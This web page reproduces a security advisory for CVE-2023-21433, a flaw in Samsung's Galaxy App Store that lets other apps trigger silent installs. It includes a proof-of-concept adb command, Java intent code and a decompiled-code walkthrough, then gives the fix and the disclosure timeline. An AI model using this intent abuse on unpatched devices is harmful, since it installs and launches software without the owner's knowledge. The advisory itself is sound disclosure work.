<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2023-21433 Details | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2023-21433 Details" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/cves/cve-2023-21433" />
<meta property="og:url" content="http://localhost:4000/cves/cve-2023-21433" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2023-21433 Details" />
<script type="application/ld+json">
{"headline":"CVE-2023-21433 Details","@type":"WebPage","description":"Sometimes I want to publish stuff unfiltered.","url":"http://localhost:4000/cves/cve-2023-21433","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">CVE-2023-21433 Details</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpsresearchnccgroupcom20230120technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434">Original post: <a href="https://research.nccgroup.com/2023/01/20/technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434/">https://research.nccgroup.com/2023/01/20/technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Galaxy Store 4.5.44.1, other versions affected</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2023-21433</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Automatic Application Install</td>
    </tr>
  </tbody>
</table>

<h2 id="summary">Summary</h2>

<p>It was found that the Galaxy App Store has an exported activity which does not handle incoming intents in a safe manner. This allows other applications installed on the same Samsung device to automatically install any application available on the Galaxy App Store without the user’s knowledge.</p>

<p>It should be noted that due to the changes made to Android 13, this issue only affects Samsung devices that are running Android 12 and below.</p>

<h2 id="impact">Impact</h2>

<p>A pre-installed rouge application on a Samsung device running Android 12 or below can abuse this issue to install any application currently available on the Galaxy App Store.</p>

<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>

<p>The following adb command can be used to abuse this issue to automatically install the application “Pokemon Go”:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>am start -n com.sec.android.app.samsungapps/.detail.alleypopup.AlleyDetailActivity --es GUID com.nianticlabs.pokemongo.ares --ez directInstall true --ez directOpen true
</code></pre></div></div>

<p>Alternatively, the following Java code can be used to perform the same action:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent();
intent.setComponent(new ComponentName("com.sec.android.app.samsungapps", "com.sec.android.app.samsungapps.detail.alleypopup.AlleyDetailActivity"));
intent.putExtra("GUID", "com.nianticlabs.pokemongo.ares");
intent.putExtra("directInstall", true);
intent.putExtra("directOpen", true);
startActivity(intent);
</code></pre></div></div>

<h2 id="technical-walkthrough">Technical Walkthrough</h2>

<p>After executing the PoC, the activity <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.detail.alleypopup.AlleyDetailActivity</code> method <code class="language-plaintext highlighter-rouge">onCreate(bundle)</code> processes the incoming intent. As a part of this function, one of two methods will be executed depending on if the incoming intent contained a data property:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyDetailActivity {
...
public void onCreate(Bundle bundle) {
    ...
    Intent intent = getIntent();
    Uri data = intent.getData();
    ...
    if (data == null) {
        a(intent);
    } else {
        e();
    }
    ...
}
</code></pre></div></div>

<p>The PoC did not add a data property to the new intent, so the method <code class="language-plaintext highlighter-rouge">a(intent)</code> gets executed, while passing the calling intent as an argument. Within <code class="language-plaintext highlighter-rouge">a(intent)</code>, the intent and its extras are passed to class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.detail.alleypopup.AlleyBundleContainer</code> method <code class="language-plaintext highlighter-rouge">parseValues(bundle, intent)</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyDetailActivity {
...
public void a(Intent intent) {
    ...
    Bundle extras = intent.getExtras();
    AlleyBundleContainer bundleContainer = getBundleContainer();
    ...
    if (extras != null) {
        this.f = bundleContainer.parseValues(extras, intent);
    }
    ...
}
</code></pre></div></div>

<p>The method <code class="language-plaintext highlighter-rouge">parseValues(bundle, intent)</code> parses the intent extras and adds them to a Content object. Some of the important values include:</p>

<ul>
  <li>“GUID” = the package name of the application to be installed</li>
  <li>‘directInstall” = if the package should be automatically installed</li>
  <li>“directOpen” = if the application should be opened right after it is installed</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyBundleContainer {
...
public ContentDetailContainer parseValues(Bundle bundle, Intent intent) {
    Content content = new Content();
    String string = bundle.getString(“GUID”);
    content.setGUID(string);
    ...
    this.g = bundle.getBoolean(“directInstall”, false)
    this.h = bundle.getBoolean(“directOpen”, false)
    ...
    return content;
}
</code></pre></div></div>

<p>Later, since <code class="language-plaintext highlighter-rouge">directInstall</code> is set to true, the application will execute the method <code class="language-plaintext highlighter-rouge">J()</code> within the <code class="language-plaintext highlighter-rouge">AlleyDetailActivity</code> class. This method will then execute the method <code class="language-plaintext highlighter-rouge">b(AlleyDetailActivity)</code> within the class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.detail.alleypopup.b</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AlleyDetailActivity {
...
public void J() {
    ...
    if (this.d == Constant_todo.AppType.APP_NOT_INSTALLED || this.d == Constant_todo.AppType.APP_UPDATABLE) {
        b.b(this);
    }
}
</code></pre></div></div>

<p>The method <code class="language-plaintext highlighter-rouge">b(AlleyDetailActivity)</code> will then setup a task to download and install the target application which was previously specified by the incoming intent. After the application is installed, since <code class="language-plaintext highlighter-rouge">directOpen</code> was set to “True”, the Galaxy App Store application will open the newly installed application.</p>

<h2 id="recommendation">Recommendation</h2>

<p>For Samsung devices running Android 12 or lower, Samsung has released an updated version of the Galaxy App Store (version 4.5.49.8). Users should open the Galaxy App Store on their phone, and if prompted, download and install the latest version.</p>

<p>This issue does not affect devices running Android 13. Users should still update their Galaxy App Store to the latest version to address potentially other issues.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>23/11/2022</td>
      <td>Samsung notified of vulnerability</td>
    </tr>
    <tr>
      <td>23/11/2022</td>
      <td>Samsung acknowledge receipt of report and a security analyst was assigned to analyze the report</td>
    </tr>
    <tr>
      <td>11/12/2022</td>
      <td>Samsung confirmed the vulnerability and rated it as a High risk</td>
    </tr>
    <tr>
      <td>01/01/2023</td>
      <td>Samsung has released Galaxy App Store version 4.5.49.8 and has publicly disclosed the issue</td>
    </tr>
  </tbody>
</table>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
